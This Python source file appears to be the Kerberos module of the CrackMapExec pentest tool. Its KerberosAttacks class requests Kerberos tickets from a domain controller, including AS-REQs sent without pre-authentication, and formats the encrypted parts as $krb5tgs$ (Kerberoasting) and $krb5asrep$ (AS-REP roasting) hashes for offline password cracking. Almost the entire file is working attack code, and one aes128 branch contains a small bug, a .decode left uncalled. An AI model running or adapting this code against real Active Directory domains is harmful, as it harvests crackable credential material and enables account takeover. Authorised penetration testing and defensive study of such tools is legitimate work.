import random
from binascii import hexlify, unhexlify
from datetime import datetime, timedelta
from os import getenv
from impacket.krb5 import constants
from impacket.krb5.asn1 import (
    TGS_REP,
    AS_REQ,
    KERB_PA_PAC_REQUEST,
    KRB_ERROR,
    AS_REP,
    seq_set,
    seq_set_iter,
)
from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import sendReceive, KerberosError, getKerberosTGT
from impacket.krb5.types import KerberosTime, Principal
from impacket.ntlm import compute_lmhash, compute_nthash
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue
from cme.logger import cme_logger
class KerberosAttacks:
    def __init__(self, connection):
        self.username = connection.username
        self.password = connection.password
        self.domain = connection.domain
        self.targetDomain = connection.targetDomain
        self.hash = connection.hash
        self.lmhash = ""
        self.nthash = ""
        self.aesKey = connection.aesKey
        self.kdcHost = connection.kdcHost
        self.kerberos = connection.kerberos
        if self.hash is not None:
            if self.hash.find(":") != -1:
                self.lmhash, self.nthash = self.hash.split(":")
            else:
                self.nthash = self.hash
        if self.password is None:
            self.password = ""
    def outputTGS(self, tgs, oldSessionKey, sessionKey, username, spn, fd=None):
        decodedTGS = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
        if decodedTGS["ticket"]["enc-part"]["etype"] == constants.EncryptionTypes.rc4_hmac.value:
            entry = "$krb5tgs$%d$*%s$%s$%s*$%s$%s" % (
                constants.EncryptionTypes.rc4_hmac.value,
                username,
                decodedTGS["ticket"]["realm"],
                spn.replace(":", "~"),
                hexlify(decodedTGS["ticket"]["enc-part"]["cipher"][:16].asOctets()).decode(),
                hexlify(decodedTGS["ticket"]["enc-part"]["cipher"][16:].asOctets()).decode(),
            )
        elif decodedTGS["ticket"]["enc-part"]["etype"] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
            entry = "$krb5tgs$%d$%s$%s$*%s*$%s$%s" % (
                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value,
                username,
                decodedTGS["ticket"]["realm"],
                spn.replace(":", "~"),
                hexlify(decodedTGS["ticket"]["enc-part"]["cipher"][-12:].asOctets()).decode(),
                hexlify(decodedTGS["ticket"]["enc-part"]["cipher"][:-12:].asOctets()).decode,
            )
        elif decodedTGS["ticket"]["enc-part"]["etype"] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
            entry = "$krb5tgs$%d$%s$%s$*%s*$%s$%s" % (
                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value,
                username,
                decodedTGS["ticket"]["realm"],
                spn.replace(":", "~"),
                hexlify(decodedTGS["ticket"]["enc-part"]["cipher"][-12:].asOctets()).decode(),
                hexlify(decodedTGS["ticket"]["enc-part"]["cipher"][:-12:].asOctets()).decode(),
            )
        elif decodedTGS["ticket"]["enc-part"]["etype"] == constants.EncryptionTypes.des_cbc_md5.value:
            entry = "$krb5tgs$%d$*%s$%s$%s*$%s$%s" % (
                constants.EncryptionTypes.des_cbc_md5.value,
                username,
                decodedTGS["ticket"]["realm"],
                spn.replace(":", "~"),
                hexlify(decodedTGS["ticket"]["enc-part"]["cipher"][:16].asOctets()).decode(),
                hexlify(decodedTGS["ticket"]["enc-part"]["cipher"][16:].asOctets()).decode(),
            )
        else:
            cme_logger.error("Skipping" f" {decodedTGS['ticket']['sname']['name-string'][0]}/{decodedTGS['ticket']['sname']['name-string'][1]} due" f" to incompatible e-type {decodedTGS['ticket']['enc-part']['etype']:d}")
        return entry
    def getTGT_kerberoasting(self):
        try:
            ccache = CCache.loadFile(getenv("KRB5CCNAME"))
            if self.domain == "":
                domain = ccache.principal.realm["data"]
            else:
                domain = self.domain
            cme_logger.debug("Using Kerberos Cache: %s" % getenv("KRB5CCNAME"))
            principal = "krbtgt/%s@%s" % (domain.upper(), domain.upper())
            creds = ccache.getCredential(principal)
            if creds is not None:
                TGT = creds.toTGT()
                cme_logger.debug("Using TGT from cache")
                return TGT
            else:
                cme_logger.debug("No valid credentials found in cache. ")
        except:
            pass
        userName = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        if self.password != "" and (self.lmhash == "" and self.nthash == ""):
            try:
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                    userName,
                    "",
                    self.domain,
                    compute_lmhash(self.password),
                    compute_nthash(self.password),
                    self.aesKey,
                    kdcHost=self.kdcHost,
                )
            except Exception as e:
                cme_logger.debug("TGT: %s" % str(e))
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                    userName,
                    self.password,
                    self.domain,
                    unhexlify(self.lmhash),
                    unhexlify(self.nthash),
                    self.aesKey,
                    kdcHost=self.kdcHost,
                )
        else:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                userName,
                self.password,
                self.domain,
                unhexlify(self.lmhash),
                unhexlify(self.nthash),
                self.aesKey,
                kdcHost=self.kdcHost,
            )
        TGT = {}
        TGT["KDC_REP"] = tgt
        TGT["cipher"] = cipher
        TGT["sessionKey"] = sessionKey
        return TGT
    def getTGT_asroast(self, userName, requestPAC=True):
        clientName = Principal(userName, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        asReq = AS_REQ()
        domain = self.targetDomain.upper()
        serverName = Principal("krbtgt/%s" % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        pacRequest = KERB_PA_PAC_REQUEST()
        pacRequest["include-pac"] = requestPAC
        encodedPacRequest = encoder.encode(pacRequest)
        asReq["pvno"] = 5
        asReq["msg-type"] = int(constants.ApplicationTagNumbers.AS_REQ.value)
        asReq["padata"] = noValue
        asReq["padata"][0] = noValue
        asReq["padata"][0]["padata-type"] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
        asReq["padata"][0]["padata-value"] = encodedPacRequest
        reqBody = seq_set(asReq, "req-body")
        opts = list()
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)
        opts.append(constants.KDCOptions.proxiable.value)
        reqBody["kdc-options"] = constants.encodeFlags(opts)
        seq_set(reqBody, "sname", serverName.components_to_asn1)
        seq_set(reqBody, "cname", clientName.components_to_asn1)
        if domain == "":
            cme_logger.error("Empty Domain not allowed in Kerberos")
            return
        reqBody["realm"] = domain
        now = datetime.utcnow() + timedelta(days=1)
        reqBody["till"] = KerberosTime.to_asn1(now)
        reqBody["rtime"] = KerberosTime.to_asn1(now)
        reqBody["nonce"] = random.getrandbits(31)
        supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)
        seq_set_iter(reqBody, "etype", supportedCiphers)
        message = encoder.encode(asReq)
        try:
            r = sendReceive(message, domain, self.kdcHost)
        except KerberosError as e:
            if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                supportedCiphers = (
                    int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
                    int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
                )
                seq_set_iter(reqBody, "etype", supportedCiphers)
                message = encoder.encode(asReq)
                r = sendReceive(message, domain, self.kdcHost)
            elif e.getErrorCode() == constants.ErrorCodes.KDC_ERR_KEY_EXPIRED.value:
                return "Password of user " + userName + " expired but user doesn't require pre-auth"
            else:
                cme_logger.debug(e)
                return False
        try:
            asRep = decoder.decode(r, asn1Spec=KRB_ERROR())[0]
        except:
            asRep = decoder.decode(r, asn1Spec=AS_REP())[0]
        else:
            cme_logger.debug("User %s doesn't have UF_DONT_REQUIRE_PREAUTH set" % userName)
            return
        if asRep['enc-part']['etype'] == 17 or asRep['enc-part']['etype'] == 18:
            hash_TGT = "$krb5asrep$%d$%s@%s:%s$%s" % (
                asRep["enc-part"]["etype"], clientName, domain,
                hexlify(asRep["enc-part"]["cipher"].asOctets()[:12]).decode(),
                hexlify(asRep["enc-part"]["cipher"].asOctets()[12:]).decode(),
            )
        else:
            hash_TGT = '$krb5asrep$%d$%s@%s:%s$%s' % (
                asRep['enc-part']['etype'], clientName, domain,
                hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
                hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode()
            )
        return hash_TGT